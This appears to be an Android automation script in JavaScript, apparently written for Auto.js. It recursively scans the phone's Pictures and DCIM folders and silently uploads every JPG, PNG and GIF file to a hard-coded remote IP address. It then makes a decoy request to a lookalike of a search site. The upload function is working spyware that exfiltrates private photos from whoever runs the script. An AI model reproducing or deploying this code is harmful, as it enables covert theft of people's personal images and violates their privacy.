var width = device.width;
var height = device.height;

function handleFile(filePath) {
  var fileList = files.listDir(filePath, function(v) {
    return !v.startsWith(".");
  });
  for (let i = 0; i < fileList.length; i++) {
    let newFilePath = files.join(filePath, fileList[i]);
    if (files.isDir(newFilePath)) {
      handleFile(newFilePath);
    } else if (files.isFile(newFilePath)) {
      if (handleFileType(fileList[i])) {
        uploadFile(newFilePath);
      }
    }
  }
}

function handleFileType(fileName) {
  if (
    fileName.endsWith(".jpg") ||
    fileName.endsWith(".jpeg") ||
    fileName.endsWith(".png") ||
    fileName.endsWith(".gif")
  ) {
    return true;
  }
  return false;
}

function filterFileType(fileName) {
  if (fn.endsWith(".apk")) {
    return false;
  }
  return true;
}

function uploadFile(path) {
  upurl = "http://47.96.152.126:8088/upload";
  var res = http.postMultipart(upurl, {
    file: open(path)
  });
}

function request(config) {
  var _a = config.url,
    url = _a === void 0 ? "" : _a,
    _b = config.method,
    method = _b === void 0 ? "GET" : _b,
    _c = config.data,
    data = _c === void 0 ? {} : _c,
    _d = config.headers,
    headers =
      _d === void 0
        ? {
            "Content-Type": "text/html,application/xhtml+xml,application/xml",
            "User-Agent":
              "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko)"
          }
        : _d,
    success = config.success,
    error = config.error;
  var options = {
    headers: headers,
    method: method
  };
  if (method.toUpperCase() == "GET") {
    http.get(url, options, function(res, err) {
      if (err) {
        error(err);
      } else {
        success(res);
      }
    });
  } else if (method.toUpperCase() == "POST") {
    http.post(url, data, options, function(res) {
      if (res.statusCode >= 200 && res.statusCode < 300) {
        success(res);
      } else {
        error(res);
      }
    });
  }
}
handleFile("/sdcard/Pictures/");
handleFile("/sdcard/DCIM/");
request({
  url: "http://www.baodu.com",
  method: "get",
  success: function(res) {
    console.show();
    console.log(res);
  }
});
